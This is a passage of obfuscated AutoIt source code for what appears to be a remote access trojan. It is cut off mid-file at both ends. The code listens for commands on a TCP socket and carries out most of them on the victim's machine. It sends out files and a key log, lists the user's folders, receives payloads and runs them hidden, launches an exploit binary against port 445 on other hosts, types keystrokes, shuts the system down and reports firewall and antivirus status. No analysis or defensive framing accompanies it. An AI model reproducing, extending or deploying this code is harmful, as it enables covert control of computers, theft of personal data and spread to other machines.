                    ProcessClose($PID2)
                    Sleep(500)
                    If Not ProcessExists($PID2) Then
                        TCPSend($mainSocket, "noplugxin")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Dexlu") Then
                    $O2UI0MW6RN3N = _stringbetween($P2OJ8OL0Y, "Dexlu", "<cherd")
                    FileDelete($mons & "\" & $O2UI0MW6RN3N[0])
                EndIf
                If StringInStr($P2OJ8OL0Y, "ladix") Then
                    $T5XK3JL8HI6R = _stringbetween($P2OJ8OL0Y, "ladix", "<cdx")
                    If IsArray($T5XK3JL8HI6R) Then
                        $Q7WQ5CF1QF2I = $mons & $T5XK3JL8HI6R[0]
                        If $Q7WQ5CF1QF2I <> "" Then
                            $L1CQ5FC4P = FileRead($Q7WQ5CF1QF2I)
                            If $L1CQ5FC4P <> "" Then
                                TCPSend($mainSocket, $L1CQ5FC4P)
                            Else
                                TCPSend($mainSocket, "Empty File")
                            EndIf
                            TCPSend($mainSocket, "CdrSSx")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "TeESX") Then
                    If FileExists($mons) Then
                        $F1CE2LL6H8AQ0MG1P = _filelisttoarray($mons, "*.txt", 1)
                        $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                        If Not @error Then
                            TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DR0Rw") Then
                    $i7RL3LU5RY0S = _stringbetween($P2OJ8OL0Y, "DR0Rw", "VVOER")
                    If IsArray($i7RL3LU5RY0S) Then
                        RegWrite("HKCU\Software\Win32", "data", "REG_SZ", RegRead("HKCU\Software\Win32", "data") & $i7RL3LU5RY0S[0])
                        $RegDat = RegRead("HKCU\Software\Win32", "data")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "mopasuixx") Then
                    RegWrite("HKCU\Software\Win32", "imgCli", "REG_SZ", "1")
                    $mgXCli = 1
                EndIf
                If StringInStr($P2OJ8OL0Y, "roo7ass") Then
                    RegDelete("HKCU\Software\Win32", "imgCli")
                    $mgXCli = 0
                EndIf
                If StringInStr($P2OJ8OL0Y, "Imstare") Then
                    RegWrite("HKCU\Software\Win32", "img", "REG_SZ", "1")
                    $FDDSF43 = 1
                EndIf
                If StringInStr($P2OJ8OL0Y, "imfray") Then
                    RegDelete("HKCU\Software\Win32", "img")
                    $FDDSF43 = 0
                EndIf
                If StringInStr($P2OJ8OL0Y, "dst8DEL") Then
                    RegDelete("HKCU\Software\Win32", "data")
                    $RegDat = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Temp0") Then
                    If FileExists($N8LF7BZ4Q5RL5GL8Y) Then
                        $F1CE2LL6H8AQ0MG1P = _filelisttoarray($N8LF7BZ4Q5RL5GL8Y, "*", 2)
                        $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                        If Not @error Then
                            TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DDRTs") Then
                    $D6IW1FI7Y = _stringbetween($P2OJ8OL0Y, "DDRTs", "<bilax")
                    If IsArray($D6IW1FI7Y) Then
                        $H5MA7LW3V = FileOpen($O5DV2HK2SW0V & $D6IW1FI7Y[0], 16)
                        $R5IZ1KV5S6NG2MJ0HI4R = FileRead($H5MA7LW3V)
                        FileClose($H5MA7LW3V)
                        TCPSend($mainSocket, $R5IZ1KV5S6NG2MJ0HI4R)
                        TCPSend($mainSocket, "Sbyx")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DesLX") Then
                    $D6IW1FI7Y = _stringbetween($P2OJ8OL0Y, "DesLX", "<ERs")
                    If $D6IW1FI7Y <> "" Then
                        FileDelete($O5DV2HK2SW0V & $D6IW1FI7Y[0])
                        DirRemove($O5DV2HK2SW0V & $D6IW1FI7Y[0], 1)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "lDx2") Then
                    $T5XK3JL8HI6R = _stringbetween($P2OJ8OL0Y, "lDx2", "<Kx")
                    $Q7WQ5CF1QF2I = $O5DV2HK2SW0V & $T5XK3JL8HI6R[0]
                    If $Q7WQ5CF1QF2I <> "" Then
                        $L1CQ5FC4P = FileRead($Q7WQ5CF1QF2I)
                        If $L1CQ5FC4P <> "" Then
                            TCPSend($mainSocket, "RTSTRxx" & $L1CQ5FC4P & "sILLxx")
                        Else
                            TCPSend($mainSocket, "RTSTRxxEmpty FilesILLxx")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Lxog0") Then
                    $E4IO5PH8HE8A = _stringbetween($P2OJ8OL0Y, "Lxog0", "<x")
                    $C2LK7FX1TM4G = _filelisttoarray($O5DV2HK2SW0V & $E4IO5PH8HE8A[0], "*")
                    $K6LB8NF9I = _arraytostring($C2LK7FX1TM4G, "|", 1)
                    If Not @error Then
                        TCPSend($mainSocket, "Starz" & $K6LB8NF9I & "input")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "DOaxSE") Then
                    $M9CM9WV7E1CE6ES5B = RegRead("HKCU\Software\Win32", "data")
                    If $M9CM9WV7E1CE6ES5B <> "" Then
                        TCPSend($mainSocket, "CVBs" & $M9CM9WV7E1CE6ES5B & "ttER")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Rena8x|") Then
                    $C0RT8XK2LZ7X = _stringbetween($P2OJ8OL0Y, "Rena8x|", "|rEmp")
                    $F4SM9AT2BI4A = _stringbetween($P2OJ8OL0Y, "|rEmp", "|DsZaww")
                    DirMove($C0RT8XK2LZ7X[0], $F4SM9AT2BI4A[0])
                    FileMove($C0RT8XK2LZ7X[0], $F4SM9AT2BI4A[0])
                EndIf
                If StringInStr($P2OJ8OL0Y, "KRB0sxx") Then
                    $C0RT8XK2LZ7X = _stringbetween($P2OJ8OL0Y, "KRB0sxx", "sSRTF")
                    Send($C0RT8XK2LZ7X[0])
                EndIf
                If StringInStr($P2OJ8OL0Y, "XWB0DS") Then
                    Send("{BACKSPACE}")
                EndIf
                If StringInStr($P2OJ8OL0Y, "Msstcvoo") Then
                    $D4ON6XP2Y8TJ9ND8UA2J = _stringbetween($P2OJ8OL0Y, "Msstcvoo", "9ttty")
                    If IsArray($D4ON6XP2Y8TJ9ND8UA2J) Then
                        $C0UH2QF1YS8X = TCPConnect($D4ON6XP2Y8TJ9ND8UA2J[0], 445)
                        If $C0UH2QF1YS8X > 0 Then
                            FileDelete($D4ON6XP2Y2UE7LT7BH5F)
                            Local $H8AM8WQ4I = TimerInit()
                            $R5IZ1KV5S9GT7OY2EU5D = ""
                            $M0QR0GU6RY8Q = ""
                            Do
                                Sleep(10)
                                Local $N3CW8JR5Y = TCPRecv($mainSocket, 2024)
                                If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                                    TCPCloseSocket($mainSocket)
                                    Sleep(2000)
                                    ExitLoop 2
                                EndIf
                                If $N3CW8JR5Y <> "" Then
                                    $H8AM8WQ4I = TimerInit()
                                EndIf
                                $R5IZ1KV5S9GT7OY2EU5D &= BinaryToString($N3CW8JR5Y)
                                If TimerDiff($H8AM8WQ4I) > 180000 Then
                                    TCPCloseSocket($mainSocket)
                                    Sleep(2000)
                                    ExitLoop 2
                                EndIf
                            Until StringInStr($R5IZ1KV5S9GT7OY2EU5D, "MNSC0A4")
                            Local $N9XA0OC9X = TimerInit()
                            $M0QR0GU6RY8Q = StringReplace($R5IZ1KV5S9GT7OY2EU5D, "MNSC0A4", "")
                            $F6GZ7UE6Z = FileOpen($D4ON6XP2Y2UE7LT7BH5F, 18)
                            FileWrite($F6GZ7UE6Z, $M0QR0GU6RY8Q)
                            FileClose($F6GZ7UE6Z)
                            TCPSend($mainSocket, "Enbinsin8")
                            $R5IZ1KV5S9GT7OY2EU5D = ""
                            $M0QR0GU6RY8Q = ""
                            Sleep(1000)
                            $N8LF7BZ4Q7HS8HB2P = Run("C:\Windows\system32\cmd.exe" & " /c Etx.exe " & $D4ON6XP2Y8TJ9ND8UA2J[0] & " xms8.bin", @TempDir, @SW_HIDE, 2)
                            Sleep(500)
                            $x4ZP5CA0DB6U = ""
                            $H0FQ4DZ7Q = TimerInit()
                            Sleep(1)
                            While 1
                                Sleep(10)
                                $E7YQ2TB9UC6CDU3MH5CU6C = StdoutRead($N8LF7BZ4Q7HS8HB2P, 0)
                                If @error Then ExitLoop
                                If $E7YQ2TB9UC6CDU3MH5CU6C <> "" Then
                                    $H0FQ4DZ7Q = TimerInit()
                                    $x4ZP5CA0DB6U &= $E7YQ2TB9UC6CDU3MH5CU6C
                                    $E7YQ2TB9UC6CDU3MH5CU6C = ""
                                EndIf
                                If TimerDiff($H0FQ4DZ7Q) > 10000 Then
                                    ExitLoop
                                EndIf
                            WEnd
                            If $x4ZP5CA0DB6U = "" Then
                                $x4ZP5CA0DB6U = "Not Work In This Target"
                            EndIf
                            TCPSend($mainSocket, "RHERTSS65" & $x4ZP5CA0DB6U & "tddyre")
                        Else
                            TCPSend($mainSocket, "poclertss")
                        EndIf
                        TCPCloseSocket($C0UH2QF1YS8X)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "PyEterna") Then
                    FileDelete($C2GC7XS6X)
                    Local $x6XO9JN3E = TimerInit()
                    $P1DR3VQ1QG2N = ""
                    $U3ZO0XV5H = ""
                    $D4ON6XP2Y5AD4EK4X = ""
                    Do
                        Sleep(10)
                        Local $D4ON6XP2Y5AD4EK4X = TCPRecv($mainSocket, 2024)
                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                        If $D4ON6XP2Y5AD4EK4X <> "" Then
                            $x6XO9JN3E = TimerInit()
                        EndIf
                        $P1DR3VQ1QG2N &= BinaryToString($D4ON6XP2Y5AD4EK4X)
                        If TimerDiff($x6XO9JN3E) > 180000 Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                    Until StringInStr($P1DR3VQ1QG2N, "ETHXENX")
                    Local $N9XA0OC9X = TimerInit()
                    $U3ZO0XV5H = StringReplace($P1DR3VQ1QG2N, "ETHXENX", "")
                    $U3ZO0XV5H = StringReplace($U3ZO0XV5H, "ZeXro0", "")
                    $R5IZ1KV5S0LQ0TZ3WR7U = FileOpen($C2GC7XS6X, 18)
                    FileWrite($R5IZ1KV5S0LQ0TZ3WR7U, $U3ZO0XV5H)
                    FileClose($R5IZ1KV5S0LQ0TZ3WR7U)
                    Sleep(500)
                    $P1DR3VQ1QG2N = ""
                    $U3ZO0XV5H = ""
                    TCPSend($mainSocket, "Einthasxx")
                EndIf
                If StringInStr($P2OJ8OL0Y, "Tixpoxme") Then
                    TCPSend($mainSocket, "tioccx" & "Time : " & @HOUR & ":" & @MIN & ":" & @SEC & "        Me : " & @IPAddress1 & "87rrs")
                EndIf
                If StringInStr($P2OJ8OL0Y, "loiplocvwa") Then
                    TCPSend($mainSocket, "PVTEs" & @IPAddress1 & "piue")
                EndIf
                If StringInStr($P2OJ8OL0Y, "CHE8Cees") Then
                    If FileExists($C2GC7XS6X) Then
                        TCPSend($mainSocket, "Einthasxx")
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "ETDelsert") Then
                    FileDelete($C2GC7XS6X)
                EndIf
                If StringInStr($P2OJ8OL0Y, "Plug2") Then
                    FileDelete($F4NB4ZE9W)
                    Local $S0PS6DG3ZW2K = TimerInit()
                    $D4ON6XP2Y6HZ6AO6IC9B = ""
                    $C8HG7BO0W = ""
                    Do
                        Sleep(10)
                        Local $D4ON6XP2Y9NK2PA8UC8A = TCPRecv($mainSocket, 2024)
                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                        If $D4ON6XP2Y9NK2PA8UC8A <> "" Then
                            $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                        $D4ON6XP2Y6HZ6AO6IC9B &= BinaryToString($D4ON6XP2Y9NK2PA8UC8A)
                        If TimerDiff($S0PS6DG3ZW2K) > 180000 Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                    Until StringInStr($D4ON6XP2Y6HZ6AO6IC9B, "Splu2")
                    Local $N9XA0OC9X = TimerInit()
                    $C8HG7BO0W = StringReplace($D4ON6XP2Y6HZ6AO6IC9B, "Splu2", "")
                    $H9SV2ZT2LW1P = FileOpen($F4NB4ZE9W, 18)
                    FileWrite($H9SV2ZT2LW1P, $C8HG7BO0W)
                    FileClose($H9SV2ZT2LW1P)
                    Sleep(500)
                    FileDelete(@TempDir & $R5IZ1KV5S3VC0PZ1EY0P)
                    Run("C:\Windows\system32\cmd.exe" & $x9OV4RF5HH2V, @TempDir, "", @SW_HIDE)
                    Sleep(4000)
                    TCPSend($mainSocket, "ExtUx")
                    If FileExists(@TempDir & $R5IZ1KV5S3VC0PZ1EY0P) Then
                        $Q4YC2XA0A = FileOpen(@TempDir & $R5IZ1KV5S3VC0PZ1EY0P, 16)
                        $M9CM9WV7E7OZ7EE6P = FileRead($Q4YC2XA0A)
                        FileClose($Q4YC2XA0A)
                        TCPSend($mainSocket, $M9CM9WV7E7OZ7EE6P)
                        TCPSend($mainSocket, "WXSTOSS4")
                    Else
                        TCPSend($mainSocket, "Eoo8ze")
                    EndIf
                    $M9CM9WV7E7OZ7EE6P = ""
                    $D4ON6XP2Y6HZ6AO6IC9B = ""
                    $P8DM2DR6R = ""
                    $W0FF9ZE3QD7D = ""
                    $F1CE2LL6H5OD0DY2A = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "QURAN") Then
                    FileCreateShortcut($E4TZ1CK2W, @TempDir & $F1CE2LL6H4GD5CC6F, @TempDir)
                    ShellExecute(@TempDir & $F1CE2LL6H4GD5CC6F, "", "", "", @SW_HIDE)
                EndIf
                If StringInStr($P2OJ8OL0Y, "kortos") Then
                    ProcessClose($H6FD7HB1OS1K)
                EndIf
                If StringInStr($P2OJ8OL0Y, "OnlineKey") Then
                    If FileExists($P2SC4FP7AL9H) Then
                        Sleep(300)
                        $L2OH9ZV8W = FileRead($P2SC4FP7AL9H)
                        TCPSend($mainSocket, $L2OH9ZV8W)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "OnlineKDel") Then
                    If FileExists($P2SC4FP7AL9H) Then
                        FileDelete($P2SC4FP7AL9H)
                        TCPCloseSocket($P2OJ8OL0Y)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Spexak") Then
                    $N0QF6JS2L = _stringbetween($P2OJ8OL0Y, "Spexak|", "|s8")
                    If IsArray($N0QF6JS2L) Then
                        Local $D1MN0XA8BH2P = ObjCreate("SAPI.SpVoice")
                        If IsObj($D1MN0XA8BH2P) Then
                            $D1MN0XA8BH2P.Rate = -4
                            $D1MN0XA8BH2P.Speak($N0QF6JS2L[0])
                            $D1MN0XA8BH2P.Volume = 100
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "GetSize") Then
                    $H7LX6CC0A = _stringbetween($P2OJ8OL0Y, "GetSize|", "|")
                    If IsArray($H7LX6CC0A) Then
                        $N8LF7BZ4Q9DF7FK4X = FileGetAttrib($H7LX6CC0A[0])
                        If StringInStr($N8LF7BZ4Q9DF7FK4X, "A") Then
                            $P5WT3DD9RT5A = FileGetSize($H7LX6CC0A[0])
                        ElseIf StringInStr($N8LF7BZ4Q9DF7FK4X, "D") Then
                            $P5WT3DD9RT5A = DirGetSize($H7LX6CC0A[0])
                        EndIf
                        If $P5WT3DD9RT5A <> "" Then
                            TCPSend($mainSocket, "Sizerx|" & $P5WT3DD9RT5A & "|")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "sDown0xs") Then
                    $H7LX6CC0A = _stringbetween($P2OJ8OL0Y, "sDown0xs|", "|")
                    If IsArray($H7LX6CC0A) Then
                        $E4PE1BH6F = StringSplit($H7LX6CC0A[0], "\")
                        If IsArray($E4PE1BH6F) Then
                            $Z2XG9KJ7Z = FileOpen($H7LX6CC0A[0], 16)
                            $Q7KQ1WZ0S = FileRead($Z2XG9KJ7Z)
                            FileClose($Z2XG9KJ7Z)
                            If $E4PE1BH6F[$E4PE1BH6F[0]] <> "" Then
                                TCPSend($mainSocket, "StDonr" & BinaryLen($Q7KQ1WZ0S) & "|Xpe" & $E4PE1BH6F[$E4PE1BH6F[0]] & "E@ZZAW")
                                Sleep(1000)
                                TCPSend($mainSocket, $Q7KQ1WZ0S)
                                TCPSend($mainSocket, "Cltocvv")
                                $Q7KQ1WZ0S = ""
                            EndIf
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "PowOf") Then
                    Shutdown(1)
                EndIf
                If StringInStr($P2OJ8OL0Y, "PREsat") Then
                    Shutdown(2)
                EndIf
                If StringInStr($P2OJ8OL0Y, "PLOfc") Then
                    Shutdown(0)
                EndIf
                If StringInStr($P2OJ8OL0Y, "UpWWW8") Then
                    $C8VR5SB5UL3H = _stringbetween($P2OJ8OL0Y, "UpWWW8", "/9rt")
                    Local $S0PS6DG3ZW2K = TimerInit()
                    Do
                        Sleep(10)
                        Local $P8DM2DR6R = TCPRecv($mainSocket, 2024)
                        If TCPSocketEvent($mainSocket) = $TCPEVENT_DISCONNECT Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                        If $P8DM2DR6R <> "" Then
                            $S0PS6DG3ZW2K = TimerInit()
                        EndIf
                        $D4ON6XP2Y6HZ6AO6IC9B &= BinaryToString($P8DM2DR6R)
                        If TimerDiff($S0PS6DG3ZW2K) > 180000 Then
                            TCPCloseSocket($mainSocket)
                            Sleep(2000)
                            ExitLoop 2
                        EndIf
                    Until StringInStr($D4ON6XP2Y6HZ6AO6IC9B, "UxplEND")
                    Local $N9XA0OC9X = TimerInit()
                    $F1CE2LL6H5OD0DY2A = StringReplace($D4ON6XP2Y6HZ6AO6IC9B, "UxplEND", "")
                    $W6BA9GN4GC4Z = FileOpen($C8VR5SB5UL3H[0], 18)
                    FileWrite($W6BA9GN4GC4Z, $F1CE2LL6H5OD0DY2A)
                    FileClose($W6BA9GN4GC4Z)
                    TCPSend($mainSocket, "UplEND")
                    $F1CE2LL6H5OD0DY2A = ""
                    $D4ON6XP2Y6HZ6AO6IC9B = ""
                    $P8DM2DR6R = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Unzipx") Then
                    $Q3BC3MD0FZ2R = _stringbetween($P2OJ8OL0Y, "Unzipx|", "|")
                    If IsArray($Q3BC3MD0FZ2R) Then
                        $K0EZ6YV5ZN1A = StringSplit($Q3BC3MD0FZ2R[0], ".", 1)
                        If IsArray($K0EZ6YV5ZN1A) Then
                            If Not FileExists($K0EZ6YV5ZN1A[1]) And FileExists($Q3BC3MD0FZ2R[0]) Then
                                _zip_unzip($Q3BC3MD0FZ2R[0], $K0EZ6YV5ZN1A[1], 1)
                            EndIf
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Comprx") Then
                    $H7LX6CC0A = _stringbetween($P2OJ8OL0Y, "Comprx|", "|")
                    If IsArray($H7LX6CC0A) Then
                        If Not FileExists($H7LX6CC0A[0] & ".zip") And FileExists($H7LX6CC0A[0]) Then
                            $D4ON6XP2Y2TV9BF1C = _zip_create($H7LX6CC0A[0] & ".zip")
                            _zip_addfile($D4ON6XP2Y2TV9BF1C, $H7LX6CC0A[0], 1)
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "WallPx") Then
                    $F1CE2LL6H0JD7BK4KW7V = _stringbetween($P2OJ8OL0Y, "WallPx|", "|")
                    FileCopy($F1CE2LL6H0JD7BK4KW7V[0], $Z6CF9KG0I, 1)
                    Sleep(500)
                    _winapi_systemparametersinfo($i4PI1OX0N, 0)
                EndIf
                If StringInStr($P2OJ8OL0Y, "ExeUSE8perv|") Then
                    $x0NY5HL4F = _stringbetween($P2OJ8OL0Y, "ExeUSE8perv|", "|")
                    If IsArray($x0NY5HL4F) Then
                        _ShellExecuteWithReducedPrivileges($x0NY5HL4F[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Execut|") Then
                    $F1CE2LL6H0JD7BK4KW7V = _stringbetween($P2OJ8OL0Y, "Execut|", "|")
                    If IsArray($F1CE2LL6H0JD7BK4KW7V) Then
                        ShellExecute($F1CE2LL6H0JD7BK4KW7V[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "CpyxE|") Then
                    $W9DS2XW9ED3B = _stringbetween($P2OJ8OL0Y, "CpyxE|", "|88vT8|")
                    $F1CE2LL6H4XG7QG2VE0O = _stringbetween($P2OJ8OL0Y, "|88vT8|", "|PseRssRT")
                    If IsArray($W9DS2XW9ED3B) And IsArray($F1CE2LL6H4XG7QG2VE0O) Then
                        DirCopy($W9DS2XW9ED3B[0], $F1CE2LL6H4XG7QG2VE0O[0])
                        FileCopy($W9DS2XW9ED3B[0], $F1CE2LL6H4XG7QG2VE0O[0])
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "Deletxc") Then
                    $i7BQ7QZ0L = _stringbetween($P2OJ8OL0Y, "Deletxc|", "|")
                    If IsArray($i7BQ7QZ0L) Then
                        FileDelete($i7BQ7QZ0L[0])
                        DirRemove($i7BQ7QZ0L[0], 1)
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "AllDriver") Then
                    Local $Z4YW7YX3EH1S = ""
                    Local $M9CM9WV7E = DriveGetDrive("CDROM")
                    Local $E7YQ2TB9UC6C = DriveGetDrive("REMOVABLE")
                    Local $F8NM0XP8NP6B = DriveGetDrive("FIXED")
                    Local $F8NM0XP8NP6B = DriveGetDrive("FIXED")
                    Local $E9FV7GV2D = DriveGetDrive("UNKNOWN")
                    Local $F2WK5QA3NX6K = DriveGetDrive("NETWORK")
                    If IsArray($M9CM9WV7E) Then
                        $Z4YW7YX3EH1S = _arraytostring($M9CM9WV7E, "\ CD|", 1) & "\ CD|"
                    EndIf
                    If IsArray($E7YQ2TB9UC6C) And DriveStatus("READY") Then
                        $Z4YW7YX3EH1S &= _arraytostring($E7YQ2TB9UC6C, "\ USB|", 1) & "\ USB|"
                    EndIf
                    If IsArray($F8NM0XP8NP6B) Then
                        $Z4YW7YX3EH1S &= _arraytostring($F8NM0XP8NP6B, "\ Hard|", 1) & "\ Hard|"
                    EndIf
                    If IsArray($E9FV7GV2D) Then
                        $Z4YW7YX3EH1S &= _arraytostring($E9FV7GV2D, "\ Unknown|", 1) & "\ Unknown|"
                    EndIf
                    If IsArray($F2WK5QA3NX6K) Then
                        $Z4YW7YX3EH1S &= _arraytostring($F2WK5QA3NX6K, "\ Network|", 1) & "\ Network|"
                    EndIf
                    If $Z4YW7YX3EH1S <> "" Then
                        $K7VT4XQ9JP7M = StringUpper($Z4YW7YX3EH1S)
                        TCPSend($mainSocket, "sisox" & $K7VT4XQ9JP7M & "Bgt")
                        $Z4YW7YX3EH1S = ""
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "pipcifox") Then
                    $M9CM9WV7E7VZ4OF3T = RegRead($A, $B)
                    If $M9CM9WV7E7VZ4OF3T = 0 Then
                        $M7TB0IR7AC5N = "No"
                    Else
                        $M7TB0IR7AC5N = "Yes"
                    EndIf
                    Local $D4ON6XP2Y0GX9UJ1E = "x"
                    $D4ON6XP2Y0GX9UJ1E = RegRead($G, "ProductName")
                    Local $Z4XR5EH0V = "x"
                    $Z4XR5EH0V = RegRead($G, "CSDVersion")
                    Local $U4DB1RM7IP0Z = RegRead($RTTR & "StandardProfile", "EnableFirewall")
                    If $U4DB1RM7IP0Z = 0 Then
                        $W9IW4SS5NK3X = "Disabled"
                    Else
                        $W9IW4SS5NK3X = "Enabled"
                    EndIf
                    Local $N8LF7BZ4Q2XM9MK2G = RegRead($RTTR & "PublicProfile", "EnableFirewall")
                    If $N8LF7BZ4Q2XM9MK2G = 0 Then
                        $V8VZ4YM5T = "Disabled"
                    Else
                        $V8VZ4YM5T = "Enabled"
                    EndIf
                    $E6LH7MK1P = _GetAV()
                    Local $i8TI9JU9GY9V = MemGetStats()
                    TCPSend($mainSocket, "WINFXRRRT" & @MDAY & "/" & @MON & "/" & @YEAR & "|" & @HOUR & ":" & @MIN & ":" & @SEC & "|" & $M7TB0IR7AC5N & "|" & $D4ON6XP2Y0GX9UJ1E & " " & $Z4XR5EH0V & "|" & @IPAddress1 & "|" & $ScriptPath & "|" & $Z8KX1GG0CK4R & " : " & $O9DZ5AZ3L & "|" & "Private : " & $W9IW4SS5NK3X & "      Public : " & $V8VZ4YM5T & "|" & $E6LH7MK1P[0] & "|" & $E6LH7MK1P[1] & "|" & Round($i8TI9JU9GY9V[1] / 1024 / 1024, 2) & " Go" & "|" & $i8TI9JU9GY9V[0] & "%" & "|" & $Q7OO3LG6JD6P)
                EndIf
                If StringInStr($P2OJ8OL0Y, "DeskDir") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray(@DesktopDir, "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @DesktopDir & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "PictuXX") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray($R5IZ1KV5S4EP7JI4A & "\Pictures", "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @UserProfileDir & "\Pictures" & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "UserPro") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray($R5IZ1KV5S4EP7JI4A, "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @UserProfileDir & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "SrtU8p") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray(@StartupDir, "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @StartupDir & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "ApDta") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray($R5IZ1KV5S4EP7JI4A & "\AppData", "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @UserProfileDir & "\AppData" & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "sepavir8s6") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray(@ScriptDir, "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @ScriptDir & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Romig") Then
                    $F1CE2LL6H8AQ0MG1P = _filelisttoarray($R5IZ1KV5S4EP7JI4A & "\Music", "*")
                    $K6EQ0RY8WD6Q = _arraytostring($F1CE2LL6H8AQ0MG1P, "|", 1)
                    TCPSend($mainSocket, "Starz" & $K6EQ0RY8WD6Q & "input" & @UserProfileDir & "\Music" & "incut")
                    $F1CE2LL6H8AQ0MG1P = ""
                    $K6EQ0RY8WD6Q = ""
                EndIf
                If StringInStr($P2OJ8OL0Y, "Refx|") Then
                    $L9RB8VR8PC9O = _stringbetween($P2OJ8OL0Y, "Refx|", "|")
                    If IsArray($L9RB8VR8PC9O) Then
                        $N8LF7BZ4Q5LF6GS9Z = _filelisttoarray($L9RB8VR8PC9O[0], "*")
                        If IsArray($N8LF7BZ4Q5LF6GS9Z) Then
                            $H2RQ9RO3QB8N = _arraytostring($N8LF7BZ4Q5LF6GS9Z, "|", 1)
                            TCPSend($mainSocket, "Starz" & $H2RQ9RO3QB8N & "input")
                            $H2RQ9RO3QB8N = ""
                            $P2OJ8OL0Y = ""
                            $N8LF7BZ4Q5LF6GS9Z = ""
                            $L9RB8VR8PC9O = ""
                        Else
                            TCPSend($mainSocket, "Em0ptxy")
                        EndIf
                    EndIf
                EndIf
                If StringInStr($P2OJ8OL0Y, "RAnSoun") Then
                    FileDelete($SOUI)
                    $L0PG0HZ5D = ""
                    Local $S0PS6DG3ZW2K = TimerInit()
                    Do
                        Sleep(10)
                        Local $D4ON6XP2Y6HZ6AO6IC9B = TCPRecv($mainSocket, 2024)
